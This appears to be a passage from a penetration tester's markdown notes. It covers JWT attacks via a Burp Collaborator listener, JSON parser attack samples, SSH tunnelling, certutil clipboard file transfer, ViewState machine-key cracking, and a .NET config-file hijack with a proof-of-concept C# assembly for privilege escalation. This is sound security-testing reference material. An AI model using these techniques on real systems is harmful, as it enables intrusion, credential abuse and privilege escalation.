$ head -10 /tmp/passlist.txt
MyPasswordBase
M
esaBdrowssaPyM
Mypasswordbase
mypasswordbase
MYPASSWORDBASE
mYpASSWORDbASE
MyPasswordBaseed
MyPasswordBaseing
pwMyPasswordBase
...
```

## Audit JWT token

> The [TICARPI](https://github.com/ticarpi/jwt_tool) playbook and tool will be used.

Update the following keys in the file `jwtconf.ini`:

* **httplistener**: Set the burp collaborator url.
* **jwksloc**: Set the burp collaborator url and suffix `/jwks.json`.
* **proxy**: Set the burp proxy information.

Example of the result in the expected section:

```ini
[services]
jwt_tool_version = 2.2.2
# To disable the proxy option set this value to: False (no quotes)
# proxy = localhost:8080
proxy = False
# Set this to the URL you are hosting your custom JWKS file (jwttool_custom_jwks.json) - your own server,
# or maybe use this cheeky reflective URL
jwksloc = https://[ID].burpcollaborator.net/jwks.json
# Set this to the base URL of a Collaborator server, somewhere you can read live logs, a Request Bin etc.
httplistener = https://[ID].burpcollaborator.net
```

Command line to apply the complete playbook against a verification service that will be used as "oracle" to check if the token is accepted or not after a mutation:

```bash
$ python3 jwt_tool.py -t "https://app.com/token-validation-service" -M at -cv "STRING_PRESENT_IF_TOKEN_IS_ACCEPTED" -rh "Authorization: Bearer eyJhbGciOiJIU..."
```

## JSON parser issue tests

[Source](https://labs.bishopfox.com/tech-blog/an-exploration-of-json-interoperability-vulnerabilities).

### Inconsistent Duplicate Key Precedence

Sample:

```json
obj = {"test": 1, "test": 2}
```

### Key Collision: Character Truncation and Comments

#### Using Character Truncation

Some parsers truncate particular characters when they appear in a string.

Sample:

```json
{"test": 1, "test\[raw \x0d byte]": 2} 
{"test": 1, "test\ud800": 2}
{"test": 1, "test"": 2}
{"test": 1, "te\st": 2}
```

#### Using Comment Truncation

Many JSON libraries support quoteless strings and comment syntax from JavaScript interpreter environments (e.g., `/*`, `*/`).

Sample:

```json
obj = {"test": valWithoutQuotes, keyWithoutQuotes: "test" /* Comment support */}
obj = {"description": "Duplicate with comments", "test": 2, "extra": /*, "test": 1, "extra2": */}
```

### Float and Integer Representation

#### Inconsistent Large Number Decoding

When not decoded accurately, large numbers may be decoded as *MAX_INT* or 0 (or *MIN_INT* as we approach negative infinity).

Sample:

```text
999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
```

#### Inconsistent Type Representation with Infinity

Positive and negative infinity along with NaN (not a number) are not supported by the official RFC. But many parsers have chosen workarounds.

Sample:

```json
{"description": "Big float", "test": 1.0e4096}
```

### Permissive Parsing and One-off Bugs

#### Trailing Garbage

Allowing trailing garbage is a well-known issue with many JSON parsers that has been misused for many years to conduct cross-site request forgery (CSRF) attacks.

To bypass same-origin policy (SOP) "simple request" limitations, a JSON document can be posted with a trailing equals sign to suggest a `x-form-urlencoded` document, which is permitted in cross-origin requests.

Sample:

```json
{"test": 1}=
```

#### Denial-of-Service: Segmentation Faults

Can happen when libraries crashed on malformed JSON or when libraries use low-level routines that may be susceptible to memory safety issue.

## SSH local port forwarding

[Documentation](https://guide.offsecnewbie.com/port-forwarding-ssh-tunneling).

[Image source](https://twitter.com/TimMedin/status/1392912196951281670?s=03).

![Flow overview schema](SSH_Local_PortForwarding.jpg)

Command syntax:

```bash
$ ssh -p [SSH_HOST_RELAY_PORT] -L [LOCAL_IP_BINDING]:[LOCAL_PORT_BINDING]:[TARGET_IP_TO_FORWARD_TRAFFIC_TO]:[TARGET_PORT_TO_FORWARD_TRAFFIC_TO] [USER]@[SSH_HOST_RELAY]
```

Command example:

```bash
# Forward traffic on 127.0.0.1:9001 to 10.10.10.66:8080 via 10.10.10.82:4242 using key authentication on 10.10.10.82
$ssh -i  ~/.ssh/toolbox-ssh-private-key.pem -p 4242 -L 127.0.0.1:9001:10.10.10.66:8080 righettod@10.10.10.82
# Forward traffic on 10.10.10.75:9001 to 10.10.10.66:8080 via 10.10.10.82:22 using key authentication on 10.10.10.82
$ssh -i  ~/.ssh/toolbox-ssh-private-key.pem -L 10.10.10.75:9001:10.10.10.66:8080 righettod@10.10.10.82
# Forward traffic the 10.10.10.75:9001 to 10.10.10.66:8080 via 10.10.10.82:22 using password authentication on 10.10.10.82
$ssh -L 10.10.10.75:9001:10.10.10.66:8080 righettod@10.10.10.82
```

## Transfer a file between two Windows RDP session via the clipboard

> Can also be used in a context including one workstation and one RDP session.

[Source](https://www.igorkromin.net/index.php/2017/04/26/base64-encode-or-decode-on-the-command-line-without-installing-extra-tools-on-linux-windows-or-macos/).

**Step 1:**

On the *source* machine, create a script named **encode.bat** with the following set of commands:

```batch
@echo off
cls
echo Encoding %1 ...
del *.b64
certutil -encode %1 tmp.b64 && findstr /v /c:- tmp.b64 > data.b64
clip < data.b64
echo Encoded content sent to clipboard.
```

Then call the script like this `encode.bat [MY_FILE]`.

**Step 2:**

On the *destination* machine, create a script named **decode.bat** with the following set of commands:

```batch
@echo off
powershell -command "Get-Clipboard" > data.txt
certutil -decode data.txt myfile.bin
```

Then call the script like this `decode.bat` and rename the file **myfile.bin** created with the expected name and extension.

## Check if a ASPNET ViewState use leaked encryption and validation keys

> The tool [Blacklist3r](https://github.com/NotSoSecure/Blacklist3r) will be used (Windows needed).

[Documentation](https://notsosecure.com/project-blacklist3r/).

[Documentation](https://blog.liquidsec.net/2021/06/01/asp-net-cryptography-for-pentesters/).

Follow these steps:

**Step 1:**

Get the value of the following HTML INPUT fields:

* `__VIEWSTATE`: It's the [View State](https://docs.microsoft.com/en-us/previous-versions/aspnet/bb386448(v=vs.100)).
* `__VIEWSTATEGENERATOR`: It's the **modifier** parameter needed by the tool and that been used by the app to generate the ViewState (see [here](https://blog.liquidsec.net/2021/06/01/asp-net-cryptography-for-pentesters/) for hints about it, search for `__VIEWSTATEGENERATOR` in the page).

**Step 2:**

Grab a [release](https://github.com/NotSoSecure/Blacklist3r/releases) of **Blacklist3r** and the command line below.

Note:

* `/wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs=` is the **ViewState**.
* `CA0B0334` is the **modifier**.

:information_source: File `MachineKeys.txt` is provided with the release bundle.

```powershell
PS> .\AspDotNetWrapper.exe -r MachineKeys.txt -c "/wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs=" -p "viewstate" -m "CA0B0334" -s
Decode process start!!
Pocessing machinekeys AES,SHA1: 11/3571..............
Keys found!!
------------
DecryptionKey:F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2
ValidationKey:C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45
EncodedDataWithoutHash:/wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRk
```

## TOTP algorithm

> TOTP stands for **T**ime-Based **O**ne-**T**ime **P**assword.

![TOTP_algorithm](TOTP_algorithm2.jpg)

See the following tutorials:

* [How Google Authenticator Works?](TOTP_algorithm1.pdf)
* [security.stackexchange.com post](https://security.stackexchange.com/a/135953) (source of the figure above).

## Inspect java program for attack surfaces

Commands documentation:

* [jdeprscan](https://docs.oracle.com/javase/9/tools/jdeprscan.htm).
* [jdeps](https://docs.oracle.com/javase/9/tools/jdeps.htm).

Collection of commands to leverage:

```shell
# Identify deprecated API elements used by a custom program.
# Provided from JDK 9+.
$ jdeprscan sandbox-1.0-SNAPSHOT.jar
Jar file sandbox-1.0-SNAPSHOT.jar:
class eu/righettod/Sandbox uses deprecated method java/lang/String::getBytes(II[BI)V

# Identify package-level or class-level dependencies for a custom program.
# Provided from JDK 9+.
$ jdeps -v sandbox-1.0-SNAPSHOT.jar
sandbox-1.0-SNAPSHOT.jar -> java.base
   eu.righettod.Sandbox -> java.lang.Exception  java.base
   eu.righettod.Sandbox -> java.lang.Object     java.base
   eu.righettod.Sandbox -> java.lang.String     java.base
```

## HTTP Signature

* [RFC](https://datatracker.ietf.org/doc/html/draft-cavage-http-signatures-12).
* [STET PSD2 specification using HTTP Signature](https://www.stet.eu/assets/files/PSD2/1-5-1-6/api-dsp2-stet-v1.5.1.6-part-1-framework.pdf).

The folder [misc](../misc) contains materials (RSA key pair and certificate) in order to perform testing against application/api leveraging [HTTP Signature](https://datatracker.ietf.org/doc/html/draft-cavage-http-signatures-12).

:speech_balloon: Note about a requirements from [STET](https://www.stet.eu/en/psd2/) (PSD2 API) regarding the certificate file name expected:

```text
In order to assure an easy discrimination of the certificate among others, it is requested that the
last part of the URL to the certificate be suffixed by an underscore followed by the fingerprint of
the certificate. 

E.g.:
https://path.to/myQsealCertificate_612b4c7d103074b29e4c1ece1ef40bc575c0a87e
``` 

## Extract services information from OpenAPI document via JQ

> This section provide hints about how to extract services from a [OpenAPI document](https://swagger.io/specification/) (Swagger) via [JQ](https://stedolan.github.io/jq/manual/).

* [OpenAPI online viewer as mind map](http://openapi-map.apihandyman.io/).
* [JQ expressions for OpenAPI blog post](https://apihandyman.io/api-toolbox-jq-and-openapi-part-1-using-jq-to-extract-data-from-openapi-files/).
* [Collection of JQ filter files from OpenAPI document](https://github.com/arno-di-loreto/jq-and-openapi).

JQ call syntax to use *filter file* against a OpenAPI (Swagger) file:

```shell
# Syntax: 
# jq -r -f [FILTER_JQ_FILE] [SWAGGER_JSON_FILE]
$ jq -r -f list-operations.jq swagger.json
```

JQ filter to list all operations ([source](https://github.com/arno-di-loreto/jq-and-openapi/blob/part-1/list-operations.jq)) - File name `list-operations.jq`:

A adapted copy of the file `list-operations.jq` is stored [here](../scripts/list-operations.jq).

```jq
# 1 - Selects paths objects
#--------------------------
# returns [{key: path, value: path value}]
.paths # Selects the paths property content
| to_entries # Transforms
             # { "/resources": { "get": {operation data}}} 
             # to 
             # [ { "key": "/resources", 
             #     "value": { "get": {operation data}} ]
| map(select(.key | test("^x-") | not)) # Gets rid of x-tensions
# 2 - Creates an array of operations
#-----------------------------------
# returns [{path, method, summary, deprecated}]
| map ( # Applies a transformation to each element
  .key as $path # Stores the path value (.key) 
                  # in a variable ($path) for later use
  | .value # Keeps only the path's content 
           # { "get": {operation data}}
  | to_entries # Transforms 
               # { "get": {operation data}}
               # to
               # [ { "key": "get", 
               #     "value": {operation data}} ]
  | map( # Applies a transformation to each element
    select( # Keeps only elements for which the following is true
      # With IN, which returns true if the value is one of its
      # parameters, we can get rid of x- , parameters
      # description and summary properties
      .key | IN("get", "put", "post", "delete", 
         "options", "head", "patch", "trace")
    )
    | # Creates a new JSON object
    {
      method: .key,
      path: $path, # Using the variable defined on line 4
      summary: .value.summary?,
      deprecated: .value.deprecated?
    }
  )[] # Flattens array to avoid having an array 
      # of array of {path, method, summary, deprecated}
) # Now we have an array of {path, method, summary, deprecated}
# 3 - Outputs tab separated raw text
#-----------------------------------
| map( # Applies a transformation to each element
  .method + "\t" + 
  .path + "\t" + 
  .summary + 
  (if .deprecated then " (deprecated)" else "" end)
)
[] # Flattens array for raw output
```

## Google Dork hints

[Cheat sheet](GoogleDork_CheatSheet.pdf).

[Google Hacking Database](https://www.exploit-db.com/google-hacking-database).

## Hijack .NET app processing flow via its config

* [Demonstration](POCDotNetAppFlowHijackingViaConfig.mp4).
* [App configuration schema documentation](https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/).

**Context:**

1. A .NET app run with a more privilege user than my current user like for example a Windows service.
2. This app is installed in a folder in which my current user can create new files.
3. The configuration file associated to the app and, named `[APPNAME].exe.config`, is not present in the folder.
4. The app performs some HTTP/FTP requests.

**Then:**

It is possible to hijack the HTTP/FTP call flow in order to execute custom code, by performing these 2 steps:

1. Create a assembly with a class implementing the interface [System.Net.IWebRequestCreate](https://docs.microsoft.com/en-us/dotnet/api/system.net.iwebrequestcreate?view=net-5.0).
2. Put the custom code in the overrided method named `Create(Uri uri)`. Example of class code:

```csharp
using System;
using System.IO;
using System.Net;
using System.Security.Principal;

namespace ClassLibrary
{
    public class MyModule : IWebRequestCreate
    {
        private string tmpFileName = null;

        public MyModule()
        {
            this.tmpFileName = Path.GetTempPath() + "MyModule.txt";
            string msg = "MyModule::Init::" + WindowsIdentity.GetCurrent().Name;
            TraceCall(msg);
        }
        public WebRequest Create(Uri uri)
        {
            string msg = "MyModule::Create::" + WindowsIdentity.GetCurrent().Name;
            TraceCall(msg);
            //Cause a System.NullReferenceException but do not care here...
            return null;
        }

        private void TraceCall(string msg)
        {
            Console.WriteLine(msg);
            if (!File.Exists(tmpFileName))
            {
                using (StreamWriter sw = File.CreateText(tmpFileName))
                {
                    sw.WriteLine(msg);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(this.tmpFileName))
                {
                    sw.WriteLine(msg);
                }
            }
        }
    }
}
```

3. Create a [strong-named configuration](https://docs.microsoft.com/en-us/dotnet/standard/assembly/create-use-strong-named) for the assembly with Visual Studio:

![strong-named configuration](POCDotNetAppFlowHijackingViaConfig.png)

4. Compile and sign the assembly to a dll file: Ensure to match the .NET framework version used by the target application.
5. Copy the assembly dll file in the same folder than the target application.
6. Create the file `[APPNAME].exe.config` in the same folder than the target application with the following block `<webRequestModules>...</webRequestModules>` content (update the assembly info in case of need):

```xml
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <!-- ... -->
  <system.net>
    <webRequestModules>
      <!-- Drop all existing defined handler -->
      <clear/>
      <!-- Declare a handler for the FTP protocol using our assembly to execute arbitrary code -->
      <add prefix="ftp" type="ClassLibrary.MyModule, ClassLibrary, Version=1.0.0.0, Culture=neutral, PublicKeyToken=a4de98bf5421a887"/>
    </webRequestModules>
  </system.net>
</configuration>
```

:speech_balloon: To get the info block `Version=1.0.0.0, Culture=neutral, PublicKeyToken=a4de98bf5421a887` of the assembly, just open the dll file with [DNSpy](https://github.com/dnSpy/dnSpy).

7. Execute the target application: When the app will made any HTTP/FTP request (FTP in the config above) then the code of the assembly will be triggered.
